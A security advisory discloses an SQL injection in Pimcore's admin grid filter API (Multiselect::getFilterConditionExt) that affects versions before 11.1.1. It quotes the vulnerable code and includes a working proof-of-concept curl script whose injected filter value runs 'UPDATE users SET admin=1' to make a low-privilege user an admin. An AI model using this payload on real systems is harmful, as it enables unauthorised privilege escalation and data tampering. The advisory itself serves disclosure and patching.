# SQL Injection in Admin Grid Filter API through Multiselect::getFilterConditionExt()

High

[dvesh3](/dvesh3)
published
GHSA-72hh-xf79-429p
Nov 15, 2023

## Package

composer

pimcore/pimcore
([Composer](/advisories?query=ecosystem%3Acomposer))

## Affected versions

< 11.1.1

## Patched versions

11.1.1

## Description

### Summary

User input passed directly into an SQL statement allows (non-admin) backend users to execute arbitrary SQL statements.

### Details

The `/admin/object/grid-proxy` endpoint calls `getFilterCondition()` on fields of classes to be filtered for at <https://github.com/pimcore/admin-ui-classic-bundle/blob/bba7c7419cb1f06d5fd98781eab4d6995e4e5dca/src/Helper/GridHelperService.php#L311>, passing input from the request, and later executes the returned SQL.

One implementation of `getFilterCondition()` is in `Multiselect`, which does not normalize/escape/validate the passed value:

[pimcore/models/DataObject/ClassDefinition/Data/Multiselect.php](https://github.com/pimcore/pimcore/blob/42b6cfa77c4540205bdd10689893ccb73e4bac8f/models/DataObject/ClassDefinition/Data/Multiselect.php#L285-L312)

Lines 285 to 312
in
[42b6cfa](/pimcore/pimcore/commit/42b6cfa77c4540205bdd10689893ccb73e4bac8f)

|  | public function getFilterConditionExt(mixed $value, string $operator, array $params = []): string |
| --- | --- |
|  | { |
|  | if ($operator === '=' || $operator === 'LIKE') { |
|  | $name = $params['name'] ? $params['name'] : $this->name; |
|  |  |
|  | $db = \Pimcore\Db::get(); |
|  | $key = $db->quoteIdentifier($name); |
|  | if (!empty($params['brickPrefix'])) { |
|  | $key = $params['brickPrefix'].$key; |
|  | } |
|  |  |
|  | if (str\_contains($name, 'cskey') && is\_array($value) && !empty($value)) { |
|  | $values = array\_map(function ($val) use ($db) { |
|  | return $db->quote('%' .Helper::escapeLike($val). '%'); |
|  | }, $value); |
|  |  |
|  | return $key . ' LIKE ' . implode(' OR ' . $key . ' LIKE ', $values); |
|  | } |
|  |  |
|  | $value = $operator === '=' |
|  | ? "'%,".$value.",%'" |
|  | : "'%,%".$value."%,%'"; |
|  |  |
|  | return $key.' LIKE '.$value.' '; |
|  | } |
|  |  |
|  | return ''; |
|  | } |

### PoC

* Set up an example project as described on <https://pimcore.com/docs/platform/Pimcore/Getting_Started/Installation/Docker_Based_Installation> (demo package with example content)
* Enter the backend and add a new user without admin privileges, but the "Objects" permission enabled.
* Log out and back in with the new user. Grab the `X-pimcore-csrf-token` header from any request the backend does, as well as the `PHPSESSID` cookie.
* Run the following script, substituting the values accordingly:
  ```
  #!/bin/bash
  BASE_URL=http://localhost:8084 # REPLACE THIS!
  CSRF_TOKEN="bd89fd7ceb3b541dd63c200fd4fc8c8ea3cc1a05" # REPLACE THIS!
  COOKIE="PHPSESSID=a0f408f9af7657430a4e6a1608c80277" # REPLACE THIS!
  SQL="UPDATE users SET admin=1"

  FILTER_JSON="[{\"property\":\"tags\",\"operator\":\"=\",\"type\":\"list\",\"value\":[\"')); ${SQL}; --\"]}]"

  curl "${BASE_URL}/admin/object/grid-proxy?classId=EV&folderId=1119" \
      -X POST \
      -H "X-pimcore-csrf-token: ${CSRF_TOKEN}" \
      -H "Cookie: ${COOKIE}" \
      --data "filter=$FILTER_JSON"
  ```
* Refresh the backend, the user is admin now.

**Notes**

The above process also works with the initial admin user, but for demonstration purposes it is more interesting to use an unpriveleged one.

Other important variables to adjust in the above script for other deployments are the `classId=EV&folderId=1119` parameters, which must reference an existing class and folder, as well as `"property":"tags"`, which points to a Multiselect field in this class.

### Impact

Any backend user with very basic permissions can execute arbitrary SQL statements and thus alter any data or escalate their privileges to at least admin level.

### Patches

Apply [patch](https://github.com/pimcore/pimcore/commit/d164d99c90f098d0ccd6b72929c48b727e2953a0.patch) manually.

### Workarounds

Update to version 11.1.1 or apply this [patch](https://github.com/pimcore/pimcore/commit/d164d99c90f098d0ccd6b72929c48b727e2953a0.patch) manually.

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
